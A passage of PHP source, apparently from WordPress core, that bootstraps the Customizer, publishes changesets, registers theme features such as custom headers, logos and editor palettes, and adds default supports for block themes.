 * Includes and instantiates the WP_Customize_Manager class.
 *
 * Loads the Customizer at plugins_loaded when accessing the customize.php admin
 * page or when any request includes a wp_customize=on param or a customize_changeset
 * param (a UUID). This param is a signal for whether to bootstrap the Customizer when
 * WordPress is loading, especially in the Customizer preview
 * or when making Customizer Ajax requests for widgets or menus.
 *
 * @since 3.4.0
 *
 * @global WP_Customize_Manager $wp_customize
 */
function _wp_customize_include() {

	$is_customize_admin_page = ( is_admin() && 'customize.php' === basename( $_SERVER['PHP_SELF'] ) );
	$should_include          = (
		$is_customize_admin_page
		||
		( isset( $_REQUEST['wp_customize'] ) && 'on' === $_REQUEST['wp_customize'] )
		||
		( ! empty( $_GET['customize_changeset_uuid'] ) || ! empty( $_POST['customize_changeset_uuid'] ) )
	);

	if ( ! $should_include ) {
		return;
	}

	/*
	 * Note that wp_unslash() is not being used on the input vars because it is
	 * called before wp_magic_quotes() gets called. Besides this fact, none of
	 * the values should contain any characters needing slashes anyway.
	 */
	$keys       = array(
		'changeset_uuid',
		'customize_changeset_uuid',
		'customize_theme',
		'theme',
		'customize_messenger_channel',
		'customize_autosaved',
	);
	$input_vars = array_merge(
		wp_array_slice_assoc( $_GET, $keys ),
		wp_array_slice_assoc( $_POST, $keys )
	);

	$theme             = null;
	$autosaved         = null;
	$messenger_channel = null;

	/*
	 * Value false indicates UUID should be determined after_setup_theme
	 * to either re-use existing saved changeset or else generate a new UUID if none exists.
	 */
	$changeset_uuid = false;

	/*
	 * Set initially to false since defaults to true for back-compat;
	 * can be overridden via the customize_changeset_branching filter.
	 */
	$branching = false;

	if ( $is_customize_admin_page && isset( $input_vars['changeset_uuid'] ) ) {
		$changeset_uuid = sanitize_key( $input_vars['changeset_uuid'] );
	} elseif ( ! empty( $input_vars['customize_changeset_uuid'] ) ) {
		$changeset_uuid = sanitize_key( $input_vars['customize_changeset_uuid'] );
	}

	// Note that theme will be sanitized via WP_Theme.
	if ( $is_customize_admin_page && isset( $input_vars['theme'] ) ) {
		$theme = $input_vars['theme'];
	} elseif ( isset( $input_vars['customize_theme'] ) ) {
		$theme = $input_vars['customize_theme'];
	}

	if ( ! empty( $input_vars['customize_autosaved'] ) ) {
		$autosaved = true;
	}

	if ( isset( $input_vars['customize_messenger_channel'] ) ) {
		$messenger_channel = sanitize_key( $input_vars['customize_messenger_channel'] );
	}

	/*
	 * Note that settings must be previewed even outside the customizer preview
	 * and also in the customizer pane itself. This is to enable loading an existing
	 * changeset into the customizer. Previewing the settings only has to be prevented
	 * here in the case of a customize_save action because this will cause WP to think
	 * there is nothing changed that needs to be saved.
	 */
	$is_customize_save_action = (
		wp_doing_ajax()
		&&
		isset( $_REQUEST['action'] )
		&&
		'customize_save' === wp_unslash( $_REQUEST['action'] )
	);
	$settings_previewed       = ! $is_customize_save_action;

	require_once ABSPATH . WPINC . '/class-wp-customize-manager.php';
	$GLOBALS['wp_customize'] = new WP_Customize_Manager(
		compact(
			'changeset_uuid',
			'theme',
			'messenger_channel',
			'settings_previewed',
			'autosaved',
			'branching'
		)
	);
}

/**
 * Publishes a snapshot's changes.
 *
 * @since 4.7.0
 * @access private
 *
 * @global WP_Customize_Manager $wp_customize Customizer instance.
 *
 * @param string  $new_status     New post status.
 * @param string  $old_status     Old post status.
 * @param WP_Post $changeset_post Changeset post object.
 */
function _wp_customize_publish_changeset( $new_status, $old_status, $changeset_post ) {
	global $wp_customize;

	$is_publishing_changeset = (
		'customize_changeset' === $changeset_post->post_type
		&&
		'publish' === $new_status
		&&
		'publish' !== $old_status
	);
	if ( ! $is_publishing_changeset ) {
		return;
	}

	if ( empty( $wp_customize ) ) {
		require_once ABSPATH . WPINC . '/class-wp-customize-manager.php';
		$wp_customize = new WP_Customize_Manager(
			array(
				'changeset_uuid'     => $changeset_post->post_name,
				'settings_previewed' => false,
			)
		);
	}

	if ( ! did_action( 'customize_register' ) ) {
		/*
		 * When running from CLI or Cron, the customize_register action will need
		 * to be triggered in order for core, themes, and plugins to register their
		 * settings. Normally core will add_action( 'customize_register' ) at
		 * priority 10 to register the core settings, and if any themes/plugins
		 * also add_action( 'customize_register' ) at the same priority, they
		 * will have a $wp_customize with those settings registered since they
		 * call add_action() afterward, normally. However, when manually doing
		 * the customize_register action after the setup_theme, then the order
		 * will be reversed for two actions added at priority 10, resulting in
		 * the core settings no longer being available as expected to themes/plugins.
		 * So the following manually calls the method that registers the core
		 * settings up front before doing the action.
		 */
		remove_action( 'customize_register', array( $wp_customize, 'register_controls' ) );
		$wp_customize->register_controls();

		/** This filter is documented in wp-includes/class-wp-customize-manager.php */
		do_action( 'customize_register', $wp_customize );
	}
	$wp_customize->_publish_changeset_values( $changeset_post->ID );

	/*
	 * Trash the changeset post if revisions are not enabled. Unpublished
	 * changesets by default get garbage collected due to the auto-draft status.
	 * When a changeset post is published, however, it would no longer get cleaned
	 * out. This is a problem when the changeset posts are never displayed anywhere,
	 * since they would just be endlessly piling up. So here we use the revisions
	 * feature to indicate whether or not a published changeset should get trashed
	 * and thus garbage collected.
	 */
	if ( ! wp_revisions_enabled( $changeset_post ) ) {
		$wp_customize->trash_changeset_post( $changeset_post->ID );
	}
}

/**
 * Filters changeset post data upon insert to ensure post_name is intact.
 *
 * This is needed to prevent the post_name from being dropped when the post is
 * transitioned into pending status by a contributor.
 *
 * @since 4.7.0
 *
 * @see wp_insert_post()
 *
 * @param array $post_data          An array of slashed post data.
 * @param array $supplied_post_data An array of sanitized, but otherwise unmodified post data.
 * @return array Filtered data.
 */
function _wp_customize_changeset_filter_insert_post_data( $post_data, $supplied_post_data ) {
	if ( isset( $post_data['post_type'] ) && 'customize_changeset' === $post_data['post_type'] ) {

		// Prevent post_name from being dropped, such as when contributor saves a changeset post as pending.
		if ( empty( $post_data['post_name'] ) && ! empty( $supplied_post_data['post_name'] ) ) {
			$post_data['post_name'] = $supplied_post_data['post_name'];
		}
	}
	return $post_data;
}

/**
 * Adds settings for the customize-loader script.
 *
 * @since 3.4.0
 */
function _wp_customize_loader_settings() {
	$admin_origin = parse_url( admin_url() );
	$home_origin  = parse_url( home_url() );
	$cross_domain = ( strtolower( $admin_origin['host'] ) !== strtolower( $home_origin['host'] ) );

	$browser = array(
		'mobile' => wp_is_mobile(),
		'ios'    => wp_is_mobile() && preg_match( '/iPad|iPod|iPhone/', $_SERVER['HTTP_USER_AGENT'] ),
	);

	$settings = array(
		'url'           => esc_url( admin_url( 'customize.php' ) ),
		'isCrossDomain' => $cross_domain,
		'browser'       => $browser,
		'l10n'          => array(
			'saveAlert'       => __( 'The changes you made will be lost if you navigate away from this page.' ),
			'mainIframeTitle' => __( 'Customizer' ),
		),
	);

	$script = 'var _wpCustomizeLoaderSettings = ' . wp_json_encode( $settings ) . ';';

	$wp_scripts = wp_scripts();
	$data       = $wp_scripts->get_data( 'customize-loader', 'data' );
	if ( $data ) {
		$script = "$data\n$script";
	}

	$wp_scripts->add_data( 'customize-loader', 'data', $script );
}

/**
 * Returns a URL to load the Customizer.
 *
 * @since 3.4.0
 *
 * @param string $stylesheet Optional. Theme to customize. Defaults to active theme.
 *                           The theme's stylesheet will be urlencoded if necessary.
 * @return string
 */
function wp_customize_url( $stylesheet = '' ) {
	$url = admin_url( 'customize.php' );
	if ( $stylesheet ) {
		$url .= '?theme=' . urlencode( $stylesheet );
	}
	return esc_url( $url );
}

/**
 * Prints a script to check whether or not the Customizer is supported,
 * and apply either the no-customize-support or customize-support class
 * to the body.
 *
 * This function MUST be called inside the body tag.
 *
 * Ideally, call this function immediately after the body tag is opened.
 * This prevents a flash of unstyled content.
 *
 * It is also recommended that you add the "no-customize-support" class
 * to the body tag by default.
 *
 * @since 3.4.0
 * @since 4.7.0 Support for IE8 and below is explicitly removed via conditional comments.
 * @since 5.5.0 IE8 and older are no longer supported.
 */
function wp_customize_support_script() {
	$admin_origin = parse_url( admin_url() );
	$home_origin  = parse_url( home_url() );
	$cross_domain = ( strtolower( $admin_origin['host'] ) !== strtolower( $home_origin['host'] ) );
	ob_start();
	?>
	<script>
		(function() {
			var request, b = document.body, c = 'className', cs = 'customize-support', rcs = new RegExp('(^|\\s+)(no-)?'+cs+'(\\s+|$)');

	<?php	if ( $cross_domain ) : ?>
			request = (function(){ var xhr = new XMLHttpRequest(); return ('withCredentials' in xhr); })();
	<?php	else : ?>
			request = true;
	<?php	endif; ?>

			b[c] = b[c].replace( rcs, ' ' );
			// The customizer requires postMessage and CORS (if the site is cross domain).
			b[c] += ( window.postMessage && request ? ' ' : ' no-' ) + cs;
		}());
	</script>
	<?php
	wp_print_inline_script_tag( wp_remove_surrounding_empty_script_tags( ob_get_clean() ) );
}

/**
 * Whether the site is being previewed in the Customizer.
 *
 * @since 4.0.0
 *
 * @global WP_Customize_Manager $wp_customize Customizer instance.
 *
 * @return bool True if the site is being previewed in the Customizer, false otherwise.
 */
function is_customize_preview() {
	global $wp_customize;

	return ( $wp_customize instanceof WP_Customize_Manager ) && $wp_customize->is_preview();
}

/**
 * Makes sure that auto-draft posts get their post_date bumped or status changed
 * to draft to prevent premature garbage-collection.
 *
 * When a changeset is updated but remains an auto-draft, ensure the post_date
 * for the auto-draft posts remains the same so that it will be
 * garbage-collected at the same time by `wp_delete_auto_drafts()`. Otherwise,
 * if the changeset is updated to be a draft then update the posts
 * to have a far-future post_date so that they will never be garbage collected
 * unless the changeset post itself is deleted.
 *
 * When a changeset is updated to be a persistent draft or to be scheduled for
 * publishing, then transition any dependent auto-drafts to a draft status so
 * that they likewise will not be garbage-collected but also so that they can
 * be edited in the admin before publishing since there is not yet a post/page
 * editing flow in the Customizer. See #39752.
 *
 * @link https://core.trac.wordpress.org/ticket/39752
 *
 * @since 4.8.0
 * @access private
 * @see wp_delete_auto_drafts()
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string   $new_status Transition to this post status.
 * @param string   $old_status Previous post status.
 * @param \WP_Post $post       Post data.
 */
function _wp_keep_alive_customize_changeset_dependent_auto_drafts( $new_status, $old_status, $post ) {
	global $wpdb;
	unset( $old_status );

	// Short-circuit if not a changeset or if the changeset was published.
	if ( 'customize_changeset' !== $post->post_type || 'publish' === $new_status ) {
		return;
	}

	$data = json_decode( $post->post_content, true );
	if ( empty( $data['nav_menus_created_posts']['value'] ) ) {
		return;
	}

	/*
	 * Actually, in lieu of keeping alive, trash any customization drafts here if the changeset itself is
	 * getting trashed. This is needed because when a changeset transitions to a draft, then any of the
	 * dependent auto-draft post/page stubs will also get transitioned to customization drafts which
	 * are then visible in the WP Admin. We cannot wait for the deletion of the changeset in which
	 * _wp_delete_customize_changeset_dependent_auto_drafts() will be called, since they need to be
	 * trashed to remove from visibility immediately.
	 */
	if ( 'trash' === $new_status ) {
		foreach ( $data['nav_menus_created_posts']['value'] as $post_id ) {
			if ( ! empty( $post_id ) && 'draft' === get_post_status( $post_id ) ) {
				wp_trash_post( $post_id );
			}
		}
		return;
	}

	$post_args = array();
	if ( 'auto-draft' === $new_status ) {
		/*
		 * Keep the post date for the post matching the changeset
		 * so that it will not be garbage-collected before the changeset.
		 */
		$post_args['post_date'] = $post->post_date; // Note wp_delete_auto_drafts() only looks at this date.
	} else {
		/*
		 * Since the changeset no longer has an auto-draft (and it is not published)
		 * it is now a persistent changeset, a long-lived draft, and so any
		 * associated auto-draft posts should likewise transition into having a draft
		 * status. These drafts will be treated differently than regular drafts in
		 * that they will be tied to the given changeset. The publish meta box is
		 * replaced with a notice about how the post is part of a set of customized changes
		 * which will be published when the changeset is published.
		 */
		$post_args['post_status'] = 'draft';
	}

	foreach ( $data['nav_menus_created_posts']['value'] as $post_id ) {
		if ( empty( $post_id ) || 'auto-draft' !== get_post_status( $post_id ) ) {
			continue;
		}
		$wpdb->update(
			$wpdb->posts,
			$post_args,
			array( 'ID' => $post_id )
		);
		clean_post_cache( $post_id );
	}
}

/**
 * Creates the initial theme features when the 'setup_theme' action is fired.
 *
 * See {@see 'setup_theme'}.
 *
 * @since 5.5.0
 * @since 6.0.1 The `block-templates` feature was added.
 */
function create_initial_theme_features() {
	register_theme_feature(
		'align-wide',
		array(
			'description'  => __('Whether theme opts in to wide alignment CSS class.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'automatic-feed-links',
		array(
			'description'  => __( 'Whether posts and comments RSS feed links are added to head.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'block-templates',
		array(
			'description'  => __( 'Whether a theme uses block-based templates.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'block-template-parts',
		array(
			'description'  => __( 'Whether a theme uses block-based template parts.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'custom-background',
		array(
			'description'  => __( 'Custom background if defined by the theme.' ),
			'type'         => 'object',
			'show_in_rest' => array(
				'schema' => array(
					'properties' => array(
						'default-image'      => array(
							'type'   => 'string',
							'format' => 'uri',
						),
						'default-preset'     => array(
							'type' => 'string',
							'enum' => array(
								'default',
								'fill',
								'fit',
								'repeat',
								'custom',
							),
						),
						'default-position-x' => array(
							'type' => 'string',
							'enum' => array(
								'left',
								'center',
								'right',
							),
						),
						'default-position-y' => array(
							'type' => 'string',
							'enum' => array(
								'left',
								'center',
								'right',
							),
						),
						'default-size'       => array(
							'type' => 'string',
							'enum' => array(
								'auto',
								'contain',
								'cover',
							),
						),
						'default-repeat'     => array(
							'type' => 'string',
							'enum' => array(
								'repeat-x',
								'repeat-y',
								'repeat',
								'no-repeat',
							),
						),
						'default-attachment' => array(
							'type' => 'string',
							'enum' => array(
								'scroll',
								'fixed',
							),
						),
						'default-color'      => array(
							'type' => 'string',
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'custom-header',
		array(
			'description'  => __( 'Custom header if defined by the theme.' ),
			'type'         => 'object',
			'show_in_rest' => array(
				'schema' => array(
					'properties' => array(
						'default-image'      => array(
							'type'   => 'string',
							'format' => 'uri',
						),
						'random-default'     => array(
							'type' => 'boolean',
						),
						'width'              => array(
							'type' => 'integer',
						),
						'height'             => array(
							'type' => 'integer',
						),
						'flex-height'        => array(
							'type' => 'boolean',
						),
						'flex-width'         => array(
							'type' => 'boolean',
						),
						'default-text-color' => array(
							'type' => 'string',
						),
						'header-text'        => array(
							'type' => 'boolean',
						),
						'uploads'            => array(
							'type' => 'boolean',
						),
						'video'              => array(
							'type' => 'boolean',
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'custom-logo',
		array(
			'type'         => 'object',
			'description'  => __( 'Custom logo if defined by the theme.' ),
			'show_in_rest' => array(
				'schema' => array(
					'properties' => array(
						'width'                => array(
							'type' => 'integer',
						),
						'height'               => array(
							'type' => 'integer',
						),
						'flex-width'           => array(
							'type' => 'boolean',
						),
						'flex-height'          => array(
							'type' => 'boolean',
						),
						'header-text'          => array(
							'type'  => 'array',
							'items' => array(
								'type' => 'string',
							),
						),
						'unlink-homepage-logo' => array(
							'type' => 'boolean',
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'customize-selective-refresh-widgets',
		array(
			'description'  => __( 'Whether the theme enables Selective Refresh for Widgets being managed with the Customizer.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'dark-editor-style',
		array(
			'description'  => __( 'Whether theme opts in to the dark editor style UI.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'disable-custom-colors',
		array(
			'description'  => __( 'Whether the theme disables custom colors.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'disable-custom-font-sizes',
		array(
			'description'  => __( 'Whether the theme disables custom font sizes.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'disable-custom-gradients',
		array(
			'description'  => __( 'Whether the theme disables custom gradients.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'disable-layout-styles',
		array(
			'description'  => __( 'Whether the theme disables generated layout styles.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'editor-color-palette',
		array(
			'type'         => 'array',
			'description'  => __( 'Custom color palette if defined by the theme.' ),
			'show_in_rest' => array(
				'schema' => array(
					'items' => array(
						'type'       => 'object',
						'properties' => array(
							'name'  => array(
								'type' => 'string',
							),
							'slug'  => array(
								'type' => 'string',
							),
							'color' => array(
								'type' => 'string',
							),
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'editor-font-sizes',
		array(
			'type'         => 'array',
			'description'  => __( 'Custom font sizes if defined by the theme.' ),
			'show_in_rest' => array(
				'schema' => array(
					'items' => array(
						'type'       => 'object',
						'properties' => array(
							'name' => array(
								'type' => 'string',
							),
							'size' => array(
								'type' => 'number',
							),
							'slug' => array(
								'type' => 'string',
							),
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'editor-gradient-presets',
		array(
			'type'         => 'array',
			'description'  => __( 'Custom gradient presets if defined by the theme.' ),
			'show_in_rest' => array(
				'schema' => array(
					'items' => array(
						'type'       => 'object',
						'properties' => array(
							'name'     => array(
								'type' => 'string',
							),
							'gradient' => array(
								'type' => 'string',
							),
							'slug'     => array(
								'type' => 'string',
							),
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'editor-spacing-sizes',
		array(
			'type'         => 'array',
			'description'  => __( 'Custom spacing sizes if defined by the theme.' ),
			'show_in_rest' => array(
				'schema' => array(
					'items' => array(
						'type'       => 'object',
						'properties' => array(
							'name' => array(
								'type' => 'string',
							),
							'size' => array(
								'type' => 'string',
							),
							'slug' => array(
								'type' => 'string',
							),
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'editor-styles',
		array(
			'description'  => __( 'Whether theme opts in to the editor styles CSS wrapper.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'html5',
		array(
			'type'         => 'array',
			'description'  => __( 'Allows use of HTML5 markup for search forms, comment forms, comment lists, gallery, and caption.' ),
			'show_in_rest' => array(
				'schema' => array(
					'items' => array(
						'type' => 'string',
						'enum' => array(
							'search-form',
							'comment-form',
							'comment-list',
							'gallery',
							'caption',
							'script',
							'style',
						),
					),
				),
			),
		)
	);
	register_theme_feature(
		'post-formats',
		array(
			'type'         => 'array',
			'description'  => __( 'Post formats supported.' ),
			'show_in_rest' => array(
				'name'             => 'formats',
				'schema'           => array(
					'items'   => array(
						'type' => 'string',
						'enum' => get_post_format_slugs(),
					),
					'default' => array( 'standard' ),
				),
				'prepare_callback' => static function ( $formats ) {
					$formats = is_array( $formats ) ? array_values( $formats[0] ) : array();
					$formats = array_merge( array( 'standard' ), $formats );

					return $formats;
				},
			),
		)
	);
	register_theme_feature(
		'post-thumbnails',
		array(
			'type'         => 'array',
			'description'  => __( 'The post types that support thumbnails or true if all post types are supported.' ),
			'show_in_rest' => array(
				'type'   => array( 'boolean', 'array' ),
				'schema' => array(
					'items' => array(
						'type' => 'string',
					),
				),
			),
		)
	);
	register_theme_feature(
		'responsive-embeds',
		array(
			'description'  => __( 'Whether the theme supports responsive embedded content.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'title-tag',
		array(
			'description'  => __( 'Whether the theme can manage the document title tag.' ),
			'show_in_rest' => true,
		)
	);
	register_theme_feature(
		'wp-block-styles',
		array(
			'description'  => __( 'Whether theme opts in to default WordPress block styles for viewing.' ),
			'show_in_rest' => true,
		)
	);
}

/**
 * Returns whether the active theme is a block-based theme or not.
 *
 * @since 5.9.0
 *
 * @return bool Whether the active theme is a block-based theme or not.
 */
function wp_is_block_theme() {
	return wp_get_theme()->is_block_theme();
}

/**
 * Given an element name, returns a class name.
 *
 * Alias of WP_Theme_JSON::get_element_class_name.
 *
 * @since 6.1.0
 *
 * @param string $element The name of the element.
 *
 * @return string The name of the class.
 */
function wp_theme_get_element_class_name( $element ) {
	return WP_Theme_JSON::get_element_class_name( $element );
}

/**
 * Adds default theme supports for block themes when the 'after_setup_theme' action fires.
 *
 * See {@see 'after_setup_theme'}.
 *
 * @since 5.9.0
 * @access private
 */
function _add_default_theme_supports() {
	if ( ! wp_is_block_theme() ) {
		return;
	}

	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'responsive-embeds' );
	add_theme_support( 'editor-styles' );
	/*
	 * Makes block themes support HTML5 by default for the comment block and search form
	 * (which use default template functions) and `[caption]` and `[gallery]` shortcodes.
	 * Other blocks contain their own HTML5 markup.
	 */
	add_theme_support( 'html5', array( 'comment-form', 'comment-list', 'search-form', 'gallery', 'caption', 'style', 'script' ) );
	add_theme_support( 'automatic-feed-links' );

	add_filter( 'should_load_separate_core_block_assets', '__return_true' );

	/*
	 * Remove the Customizer's Menus panel when block theme is active.
	 */
	add_filter(
		'customize_panel_active',
		static function ( $active, WP_Customize_Panel $panel ) {
			if (
				'nav_menus' === $panel->id &&
				! current_theme_supports( 'menus' ) &&
				! current_theme_supports( 'widgets' )
			) {
				$active = false;
			}
			return $active;
		},
		10,
		2
	);
}
